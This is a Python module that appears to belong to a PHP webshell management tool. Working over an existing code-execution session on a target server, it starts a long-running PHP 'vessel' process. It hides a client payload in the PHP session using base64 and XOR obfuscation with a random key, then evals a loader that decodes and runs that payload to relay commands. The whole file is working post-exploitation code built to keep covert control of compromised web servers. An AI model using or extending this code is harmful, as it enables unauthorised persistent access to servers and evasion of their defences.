import asyncio
import base64
import json
import random
import string
import time
import typing as t
import uuid
from pathlib import Path
from ..base import PHPSessionInterface
from .. import exceptions

VESSEL_SERVER_SRC = Path(__file__).parent / "server.php"
VESSEL_CLIENT_SRC = Path(__file__).parent / "client.php"


def base64_encode(text: t.Union[str, bytes]) -> str:
    if isinstance(text, str):
        return base64.b64encode(text.encode()).decode()
    return base64.b64encode(text).decode()


def xor_encode(text: str, key: str):
    key_bytes = key.encode()
    return bytes(
        (a ^ key_bytes[i % len(key_bytes)] for i, a in enumerate(text.encode()))
    )


async def start_vessel_server(session: PHPSessionInterface, timeout=10):
    code = VESSEL_SERVER_SRC.read_text().removeprefix("<?php").strip()
    vessel_client_store = f"_{uuid.uuid4()}"
    vessel_session_key = f"_{uuid.uuid4()}"
    print(f"{vessel_session_key=}")
    # 先测试一下phpsession是否可以使用
    await session.php_eval(
        f"""
@session_start();
$_SESSION['{vessel_client_store}'] = '{vessel_client_store}';
"""
    )
    stored_session_value = await session.php_eval(
        f"""
@session_start();
echo json_encode($_SESSION['{vessel_client_store}']);
"""
    )
    if json.loads(stored_session_value) != vessel_client_store:
        raise exceptions.TargetError("目标的PHP环境不支持Session!")

    # 几乎一定会timeout， 因为vessel会一直运行
    async def start_vessel_request():
        try:
            _, r = await session.php_eval_beforebody(
                code + f"\nserve_over_session('{vessel_session_key}');"
            )
            print(r)
        except Exception:
            pass

    request_task = asyncio.create_task(start_vessel_request())

    vessel_client = VESSEL_CLIENT_SRC.read_bytes().removeprefix(b"<?php")
    xor_encode_key = "".join(random.choices(string.ascii_letters + string.digits, k=32))
    vessel_client_obfs = base64_encode(
        xor_encode(base64_encode(vessel_client), xor_encode_key)
    )
    await session.php_eval(
        f"""
session_start();
$_SESSION['{vessel_client_store}'] = '{vessel_client_obfs}';
"""
    )

    check_start_time = time.perf_counter()
    check_success = False
    load_vessel_client_code = (
        (
            """
session_start();
function load_vessel_client() {
    $key = '{vessel_dec_key}';
    $str = base64_decode($_SESSION['{vessel_client_store}']);
    for ($i = 0; $i < strlen($str); $i++) {
        $str[$i] = $str[$i] ^ $key[$i % strlen($key)];
    }
    return base64_decode($str);
}
define('VESSEL_SESSION_KEY', '{vessel_session_key}');
eval(load_vessel_client());
"""
        )
        .replace("    ", "")
        .replace("{vessel_dec_key}", xor_encode_key)
        .replace("{vessel_client_store}", vessel_client_store)
        .replace("{vessel_session_key}", vessel_session_key)
    )

    while time.perf_counter() - check_start_time < timeout:
        await asyncio.sleep(0.2)
        first, second = str(uuid.uuid4()), str(uuid.uuid4())
        _, result = await session.php_eval_beforebody(
            (
                load_vessel_client_code
                + f"""echo call("call_over_session", "hello", ["{first}", "{second}"], 1);"""
            )
        )
        if f"{first} {second}" in result:
            check_success = True
            break
    if not check_success:
        raise exceptions.TargetError("启动失败：无法连接到启动的vessel")

    # 因为已经启动成功了所以直接把task给cancel掉就好了
    request_task.cancel()
    return load_vessel_client_code


def get_vessel_client(session: PHPSessionInterface, load_vessel_client_code):

    async def vessel_client_call(fn, *args, timeout):
        start_uuid, stop_uuid = str(uuid.uuid4()), str(uuid.uuid4())
        start_uuid_1, start_uuid_2 = start_uuid[:10], start_uuid[10:]
        args_b64 = base64_encode(json.dumps(args))
        _, result = await session.php_eval_beforebody(
            (
                load_vessel_client_code
                + f"""
$args = json_decode(base64_decode({args_b64!r}), true);
$result = call("call_over_session", {fn!r}, $args, {timeout!r});
echo "{start_uuid_1}" . "{start_uuid_2}";
echo $result;
echo "{stop_uuid}";
"""
            )
        )
        try:
            data = json.loads(result.rpartition(start_uuid)[2].partition(stop_uuid)[0])
        except Exception:
            return None
        if data["code"] != 0:
            raise exceptions.TargetRuntimeError(f"VESSEL_FAILED: {data['msg']}")
        return data["resp"]
    return vessel_client_call
